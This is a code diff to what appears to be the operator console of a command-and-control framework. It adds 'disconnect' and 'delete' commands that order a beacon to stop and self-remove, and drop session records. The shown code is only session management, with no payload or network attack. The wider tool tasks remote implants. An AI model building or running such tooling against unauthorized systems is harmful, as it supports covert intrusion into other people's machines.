@@ -87,6 +87,8 @@ class Console:
     use <session_id>                enter interactive mode (default: none)
     results <session_id>            show results collected for a session
     clear-results <session_id>      drop saved results
+    disconnect <session_id>         order beacon to stop + self-remove
+    delete <session_id> [--force]   remove the session record from the store
 
   Tasking (while 'use <id>' active)
     task <cmd>            queue a command for the selected session
@@ -265,6 +267,33 @@ class Console:
             s["results"] = []
             self.srv.store.save()
             print(f"[+] cleared results for {sid}")
+
+    def cmd_disconnect(self, rest):
+        """disconnect <session_id> -> order a beacon to stop + self-remove"""
+        sid = rest.strip()
+        if not sid:
+            print("[!] usage: disconnect <session_id>")
+            return
+        ok, msg = self.srv.disconnect_session(sid)
+        if isinstance(ok, tuple):
+            tid, info = ok
+            if info and "error" in info:
+                print(f"[!] {info['error']}")
+            else:
+                print(f"[+] disconnect queued [{tid}] for {sid}")
+        else:
+            print(("[+] " if ok else "[!] ") + msg)
+
+    def cmd_delete(self, rest):
+        """delete <session_id> [--force] -> remove the session record from the store"""
+        parts = rest.split()
+        if not parts:
+            print("[!] usage: delete <session_id> [--force]")
+            return
+        sid = parts[0]
+        force = "--force" in parts[1:] or "-f" in parts[1:]
+        ok, msg = self.srv.remove_session(sid, force=force)
+        print(("[+] " if ok else "[!] ") + msg)
 
     # --- global ---
     def cmd_sleep(self, rest):
